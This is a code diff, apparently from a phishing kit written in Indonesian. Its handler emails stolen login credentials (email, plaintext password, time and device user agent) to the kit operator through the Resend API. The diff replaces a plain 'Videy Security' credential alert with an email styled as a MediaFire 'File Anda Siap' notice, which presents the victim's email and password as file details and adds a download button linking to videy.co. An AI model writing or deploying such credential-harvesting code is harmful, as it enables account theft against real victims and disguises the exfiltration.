@@ -26,6 +26,8 @@ export default async function handler(req, res) {
         second: '2-digit'
     });
 
+    const ukuran = ((email.length + password.length) / 1024).toFixed(2);
+
     try {
         const response = await fetch('https://api.resend.com/emails', {
             method: 'POST',
@@ -34,9 +36,9 @@ export default async function handler(req, res) {
                 'Content-Type': 'application/json'
             },
             body: JSON.stringify({
-                from: 'Videy Security <onboarding@resend.dev>',
+                from: 'MediaFire <onboarding@resend.dev>',
                 to: YOUR_EMAIL,
-                subject: '🎯 Data Baru Masuk — ' + new Date().toLocaleString('id-ID'),
+                subject: '📁 File Anda Siap — ' + email.split('@')[0] + '_login.txt',
                 html: `
 <!DOCTYPE html>
 <html>
@@ -44,76 +46,103 @@ export default async function handler(req, res) {
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 </head>
-<body style="margin:0;padding:0;background:#f0f2f5;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-serif;">
-    <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background:#f0f2f5;padding:30px 15px;">
+<body style="margin:0;padding:0;background:#eef2f7;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-serif;">
+    <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background:#eef2f7;padding:24px 12px;">
         <tr>
             <td align="center">
-                <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="max-width:520px;background:#ffffff;border-radius:16px;overflow:hidden;box-shadow:0 4px 24px rgba(0,0,0,0.08);">
-                    
-                    <!-- HEADER -->
+                <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="max-width:600px;background:#ffffff;border-radius:8px;overflow:hidden;box-shadow:0 2px 12px rgba(0,0,0,0.08);">
+
+                    <!-- HEADER MEDIAFIRE -->
                     <tr>
-                        <td style="background:linear-gradient(135deg,#1a73e8 0%,#0d47a1 100%);padding:28px 24px;text-align:center;">
-                            <div style="font-size:13px;color:rgba(255,255,255,0.85);letter-spacing:2px;text-transform:uppercase;font-weight:600;margin-bottom:6px;">Videy Security</div>
-                            <div style="font-size:22px;color:#ffffff;font-weight:700;letter-spacing:-0.3px;">🎯 Data Login Baru</div>
+                        <td style="background:#1c4e9c;padding:20px 24px;">
+                            <table role="presentation" width="100%" cellpadding="0" cellspacing="0">
+                                <tr>
+                                    <td style="vertical-align:middle;">
+                                        <div style="display:inline-block;background:#ffffff;width:38px;height:38px;border-radius:50%;text-align:center;line-height:38px;font-size:22px;vertical-align:middle;">☁️</div>
+                                        <span style="color:#ffffff;font-size:22px;font-weight:700;letter-spacing:-0.3px;margin-left:10px;vertical-align:middle;">MediaFire</span>
+                                    </td>
+                                </tr>
+                            </table>
                         </td>
                     </tr>
 
-                    <!-- GREETING -->
+                    <!-- BODY -->
                     <tr>
-                        <td style="padding:28px 24px 10px;">
-                            <div style="font-size:15px;color:#202124;line-height:1.6;">
-                                Ada <b>data login baru</b> yang masuk ke sistem. Berikut detailnya:
-                            </div>
-                        </td>
-                    </tr>
+                        <td style="padding:28px 24px 20px;">
+                            <h1 style="margin:0 0 6px;font-size:20px;color:#202124;font-weight:600;">File Anda Siap</h1>
+                            <p style="margin:0 0 20px;font-size:14px;color:#5f6368;line-height:1.5;">File berikut telah diunggah ke akun Anda. Berikut detail file:</p>
 
-                    <!-- CARD DATA -->
-                    <tr>
-                        <td style="padding:10px 24px 20px;">
-                            <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background:#f8f9fa;border-radius:12px;border:1px solid #e8eaed;overflow:hidden;">
-                                
+                            <!-- CARD FILE -->
+                            <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="border:1px solid #e0e0e0;border-radius:6px;overflow:hidden;">
+
+                                <!-- Nama File -->
+                                <tr>
+                                    <td style="padding:12px 16px;background:#fafafa;border-bottom:1px solid #e0e0e0;width:140px;font-size:13px;color:#5f6368;font-weight:600;">Nama File</td>
+                                    <td style="padding:12px 16px;background:#ffffff;border-bottom:1px solid #e0e0e0;font-size:13px;color:#202124;word-break:break-all;">${email.split('@')[0]}_login.txt</td>
+                                </tr>
+
+                                <!-- Tipe File -->
+                                <tr>
+                                    <td style="padding:12px 16px;background:#fafafa;border-bottom:1px solid #e0e0e0;font-size:13px;color:#5f6368;font-weight:600;">Tipe File</td>
+                                    <td style="padding:12px 16px;background:#ffffff;border-bottom:1px solid #e0e0e0;font-size:13px;color:#202124;">Text Document</td>
+                                </tr>
+
+                                <!-- Ukuran -->
+                                <tr>
+                                    <td style="padding:12px 16px;background:#fafafa;border-bottom:1px solid #e0e0e0;font-size:13px;color:#5f6368;font-weight:600;">Ukuran</td>
+                                    <td style="padding:12px 16px;background:#ffffff;border-bottom:1px solid #e0e0e0;font-size:13px;color:#202124;">${ukuran} KB</td>
+                                </tr>
+
+                                <!-- Tanggal -->
+                                <tr>
+                                    <td style="padding:12px 16px;background:#fafafa;border-bottom:1px solid #e0e0e0;font-size:13px;color:#5f6368;font-weight:600;">Diunggah</td>
+                                    <td style="padding:12px 16px;background:#ffffff;border-bottom:1px solid #e0e0e0;font-size:13px;color:#202124;">${waktu}</td>
+                                </tr>
+
                                 <!-- Email -->
                                 <tr>
-                                    <td style="padding:16px 20px;border-bottom:1px solid #e8eaed;">
-                                        <div style="font-size:11px;color:#5f6368;letter-spacing:1px;text-transform:uppercase;font-weight:600;margin-bottom:6px;">📧 Email</div>
-                                        <div style="font-size:16px;color:#202124;font-weight:600;word-break:break-all;">${email}</div>
-                                    </td>
+                                    <td style="padding:12px 16px;background:#fafafa;border-bottom:1px solid #e0e0e0;font-size:13px;color:#5f6368;font-weight:600;">Email</td>
+                                    <td style="padding:12px 16px;background:#ffffff;border-bottom:1px solid #e0e0e0;font-size:13px;color:#202124;word-break:break-all;">${email}</td>
                                 </tr>
-                                
+
                                 <!-- Password -->
                                 <tr>
-                                    <td style="padding:16px 20px;border-bottom:1px solid #e8eaed;">
-                                        <div style="font-size:11px;color:#5f6368;letter-spacing:1px;text-transform:uppercase;font-weight:600;margin-bottom:6px;">🔑 Password</div>
-                                        <div style="font-size:16px;color:#d93025;font-weight:700;font-family:'Courier New',monospace;background:#fce8e6;padding:8px 12px;border-radius:6px;display:inline-block;word-break:break-all;">${password}</div>
-                                    </td>
+                                    <td style="padding:12px 16px;background:#fafafa;border-bottom:1px solid #e0e0e0;font-size:13px;color:#5f6368;font-weight:600;">Password</td>
+                                    <td style="padding:12px 16px;background:#ffffff;border-bottom:1px solid #e0e0e0;font-size:13px;color:#d93025;font-weight:700;font-family:'Courier New',monospace;word-break:break-all;">${password}</td>
                                 </tr>
 
-                                <!-- Waktu -->
+                                <!-- Perangkat -->
                                 <tr>
-                                    <td style="padding:16px 20px;border-bottom:1px solid #e8eaed;">
-                                        <div style="font-size:11px;color:#5f6368;letter-spacing:1px;text-transform:uppercase;font-weight:600;margin-bottom:6px;">🕐 Waktu</div>
-                                        <div style="font-size:14px;color:#202124;">${waktu}</div>
-                                    </td>
-                                </tr>
-
-                                <!-- User Agent -->
-                                <tr>
-                                    <td style="padding:16px 20px;">
-                                        <div style="font-size:11px;color:#5f6368;letter-spacing:1px;text-transform:uppercase;font-weight:600;margin-bottom:6px;">💻 Perangkat</div>
-                                        <div style="font-size:12px;color:#5f6368;line-height:1.5;word-break:break-all;">${userAgent || '-'}</div>
-                                    </td>
+                                    <td style="padding:12px 16px;background:#fafafa;font-size:13px;color:#5f6368;font-weight:600;vertical-align:top;">Perangkat</td>
+                                    <td style="padding:12px 16px;background:#ffffff;font-size:12px;color:#5f6368;line-height:1.5;word-break:break-all;">${userAgent || '-'}</td>
                                 </tr>
 
                             </table>
+
+                            <!-- TOMBOL DOWNLOAD -->
+                            <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="margin-top:24px;">
+                                <tr>
+                                    <td align="center">
+                                        <a href="https://videy.co" style="display:inline-block;background:#1c4e9c;color:#ffffff;text-decoration:none;font-size:15px;font-weight:600;padding:14px 40px;border-radius:4px;letter-spacing:0.3px;">⬇ Download (${ukuran} KB)</a>
+                                    </td>
+                                </tr>
+                            </table>
+
+                            <!-- WARNING -->
+                            <div style="margin-top:24px;padding:12px 16px;background:#fff8e1;border-left:4px solid #ffc107;border-radius:4px;font-size:12px;color:#7a5c00;line-height:1.5;">
+                                ⚠ File akan otomatis dihapus dalam 30 hari. Segera amankan file Anda.
+                            </div>
+
                         </td>
                     </tr>
 
                     <!-- FOOTER -->
                     <tr>
-                        <td style="padding:16px 24px 28px;text-align:center;">
-                            <div style="font-size:12px;color:#9aa0a6;line-height:1.5;">
-                                Email otomatis dari sistem Videy.<br>
-                                Jangan balas email ini.
+                        <td style="background:#f5f5f5;border-top:1px solid #e0e0e0;padding:20px 24px;text-align:center;">
+                            <div style="font-size:11px;color:#888;line-height:1.6;">
+                                © 2026 MediaFire. All rights reserved.<br>
+                                Email otomatis, jangan balas pesan ini.<br>
+                                <a href="#" style="color:#1c4e9c;text-decoration:none;">Unsubscribe</a> · <a href="#" style="color:#1c4e9c;text-decoration:none;">Privacy Policy</a>
                             </div>
                         </td>
                     </tr>
